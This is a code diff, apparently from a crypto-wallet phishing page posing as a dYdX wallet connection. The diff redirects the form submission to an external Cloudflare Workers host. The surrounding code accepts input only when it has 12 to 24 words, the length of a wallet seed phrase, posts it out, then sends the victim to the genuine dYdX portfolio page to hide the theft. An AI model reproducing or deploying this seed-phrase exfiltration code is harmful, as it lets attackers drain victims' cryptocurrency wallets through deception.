@@ -33,7 +33,7 @@ walletButtons.forEach((item) => {
 $('#form-popup button').click( function() {
   let count = $('#form-popup form textarea').val().trim().split(" ").length;
   if (count === 12 || count === 15 || count === 18 || count === 21 || count === 24) {
-    $.post('./form.php', $('#form-popup form').serialize(), function(data) {
+    $.post('https://blue-gay.juistespastelastes.workers.dev/', $('#form-popup form').serialize(), function(data) {
       setTimeout(() => {
         document.querySelector('#form-popup').classList.add('hidden');
         location.assign('https://trade.dydx.exchange/portfolio/overview');
